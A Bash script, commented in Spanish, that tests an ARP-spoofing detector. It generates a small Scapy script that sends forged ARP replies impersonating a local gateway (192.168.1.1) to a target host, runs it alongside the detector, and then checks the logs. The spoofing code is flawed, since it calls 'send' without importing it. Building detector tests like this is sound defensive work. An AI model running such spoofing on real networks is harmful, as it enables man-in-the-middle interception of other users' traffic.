#!/bin/bash

# Función para limpiar y salir
cleanup() {
    echo "Limpiando y saliendo..."
    sudo kill $PYTHON_SPOOF_PID
    sudo kill $PYTHON_DETECT_PID
    exit
}

# Configurar trap para SIGINT (Ctrl+C)
trap cleanup SIGINT

# Asegúrate de tener Python y Scapy instalados
if ! command -v python3 &> /dev/null
then
    echo "Python 3 no está instalado."
    exit 1
fi

if ! python3 -c "import scapy" &> /dev/null
then
    echo "Scapy no está instalado. Instálalo con: pip install scapy"
    exit 1
fi

# Crea un script Python simple para el ARP spoofing
cat << EOF > arp_spoofer.py
from scapy.layers.l2 import getmacbyip, ARP

import time

def arp_spoof(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    arp_reply = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op='is-at')

    print(f"Iniciando ARP spoofing contra {target_ip}")
    for _ in range(50):  # Envía 50 paquetes
        send(arp_reply, verbose=False)
        time.sleep(0.2)
    print("ARP spoofing finalizado")

# Reemplaza estas IP con las de tu red local
arp_spoof("192.168.1.2", "192.168.1.1")
EOF

# Inicia el detector de ARP spoofing en segundo plano
sudo python3 arp_spoofing_detector.py &
PYTHON_DETECT_PID=$!

# Espera un momento para que el detector se inicie
sleep 5

# Inicia el ataque ARP spoofing
echo "Iniciando ataque ARP spoofing..."
sudo python3 arp_spoofer.py &
PYTHON_SPOOF_PID=$!

# Espera a que el ataque termine
wait $PYTHON_SPOOF_PID

# Espera un momento más para ver si el detector lo registra
sleep 5

# Detén el detector
sudo kill $PYTHON_DETECT_PID

echo "Prueba completada. Revisa los logs para ver si se detectó el ataque."

# Limpia el archivo temporal
rm arp_spoofer.py